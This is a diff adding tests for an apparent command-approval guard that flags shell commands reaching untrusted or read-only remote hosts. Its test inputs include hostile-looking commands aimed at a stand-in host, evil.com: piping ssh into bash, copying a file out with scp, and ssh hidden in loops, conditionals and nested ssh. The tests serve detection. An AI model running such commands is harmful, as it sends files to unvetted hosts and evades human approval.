@@ -227,3 +227,161 @@ describe('the hit names the host and the way to trust it', () => {
     ).toHaveLength(1);
   });
 });
+
+// -----------------------------------------------------------------------------
+// The gaps BANA's harness found (issue #164)
+// -----------------------------------------------------------------------------
+
+describe('kubectl reads against a readOnly context pass, and the prompt says so', () => {
+  test('get, describe, logs and top are reads', () => {
+    for (const verb of ['get pods', 'describe pod api-0', 'logs api-0', 'top pods']) {
+      expect(asks(`kubectl --context prod1 ${verb}`)).toBe(false);
+    }
+  });
+
+  test('the readOnly message names those verbs, so the allowance is no surprise', () => {
+    const [hit] = inspectRemoteCommand({
+      command: 'kubectl --context prod1 delete pod x',
+      policy: POLICY,
+    });
+
+    expect(hit?.message).toContain('kubectl get|describe|logs|top');
+  });
+});
+
+describe('HTTP clients: a readOnly host asks, the open internet stays quiet', () => {
+  test.each([
+    'curl http://prod1:8080/admin',
+    'curl -s https://prod1/health',
+    'curl -X POST -d x=1 http://prod1/api',
+    'curl prod1:8080/admin',
+    'curl --url=http://prod1/x',
+    'curl -H "Accept: json" https://deploy@prod1.example.com/x --resolve a:80:b http://prod2.example.com/y',
+    'wget http://prod1/x',
+    'wget -qO- prod2.example.com/file',
+    'http GET http://prod1/x',
+    'https prod1/x',
+    'xh get http://prod1/x',
+    'cd /tmp && curl http://prod1/x',
+  ])('%s asks', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test.each([
+    'curl https://example.com/data.json',
+    'curl -sL https://registry.npmjs.org/left-pad',
+    'wget https://example.com/file.tgz',
+    'curl http://lab1/status',
+    'curl -H "Host: prod1" https://example.com',
+    'http GET https://api.github.com/user',
+  ])('%s passes', command => {
+    expect(asks(command)).toBe(false);
+  });
+});
+
+describe('a command piped or fed into a shell cannot be read', () => {
+  test.each([
+    'cat <<< "ssh evil.com" | sh',
+    'echo "ssh evil.com" | bash',
+    'bash <<< "ssh evil.com"',
+    'sh -s',
+    'bash -s -- arg',
+    'cat script | sh -x',
+    'ls | xargs sh',
+  ])('%s asks', command => {
+    const [hit] = inspectRemoteCommand({ command, policy: POLICY });
+
+    expect(hit?.message).toContain('cannot be read');
+  });
+
+  test.each(['bash script.sh', 'sh -c "ls"', 'bash -x ./build.sh arg', 'echo hi | cat'])(
+    '%s passes',
+    command => {
+      expect(asks(command)).toBe(false);
+    },
+  );
+});
+
+describe('the remote command of an ssh is read too', () => {
+  test.each([
+    'ssh lab1 "ssh prod1 id"',
+    'ssh lab1 ssh evil.com id',
+    'ssh lab1 "uptime; ssh evil.com id"',
+    'ssh lab1 "scp f evil.com:/x"',
+    'ssh lab1 "ssh $(cat h) id"',
+    'ssh lab1 "bash -c \'ssh evil.com\'"',
+  ])('%s asks', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test.each([
+    'ssh lab1 "ssh a.lab.example.com id"',
+    'ssh lab1 "ssh prod1 uptime"',
+    'ssh lab1 "kubectl get pods"',
+    'ssh lab1 "docker ps"',
+    'ssh lab1 systemctl restart nginx',
+  ])('%s passes', command => {
+    expect(asks(command)).toBe(false);
+  });
+});
+
+describe('a command after a shell keyword is still a command', () => {
+  test.each([
+    'for h in lab1 prod1; do ssh $h id; done',
+    'for h in lab1 evil.com; do ssh $h id; done',
+    'for h in evil.com; do ssh ${h} id; done',
+    'while true; do ssh evil.com id; done',
+    'if ssh evil.com id; then echo ok; fi',
+    'if true; then ssh evil.com; else echo no; fi',
+    'if false; then echo no; elif ssh evil.com; then echo ok; fi',
+    '{ ssh evil.com id; }',
+    'until ssh evil.com id; do sleep 1; done',
+    '! ssh evil.com id',
+    'for h in a; do scp f $h:/x; done',
+    'for h in a; do for g in b; do ssh evil.com; done; done',
+  ])('%s asks', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test.each([
+    'for h in lab1; do ssh lab1 id; done',
+    'if ssh lab1 id; then echo ok; fi',
+    'for f in a b; do echo $f; done',
+    'while read x; do ls; done',
+  ])('%s passes', command => {
+    expect(asks(command)).toBe(false);
+  });
+});
+
+describe('docker over ssh: a trusted host in the parsed form passes', () => {
+  test.each([
+    'docker -H ssh://lab1 ps',
+    'docker --host ssh://deploy@lab1:2222 ps',
+    'docker --host=ssh://lab1 logs api',
+    'docker -Hssh://lab1 ps',
+    'docker -H ssh://a.lab.example.com ps',
+    'docker -H tcp://10.0.0.5:2375 ps',
+  ])('%s passes', command => {
+    expect(asks(command)).toBe(false);
+  });
+
+  test.each([
+    'docker -H ssh://evil.com ps',
+    'docker -H ssh://lab1.evil.com ps',
+    'docker -H ssh://prod1 ps',
+    'docker -H tcp://evil.com:2375 ps',
+    'docker -H ssh://lab1 -H ssh://evil.com ps',
+    'docker -H unix:///var/run/docker.sock -H ssh://evil.com ps',
+    'docker -H ps',
+    'docker --context prod ps',
+    'docker -c prod ps',
+    'docker context use prod',
+    'docker -H $HOST ps',
+  ])('%s asks', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test('a local socket reaches no remote host', () => {
+    expect(asks('docker -H unix:///var/run/docker.sock ps')).toBe(false);
+  });
+});
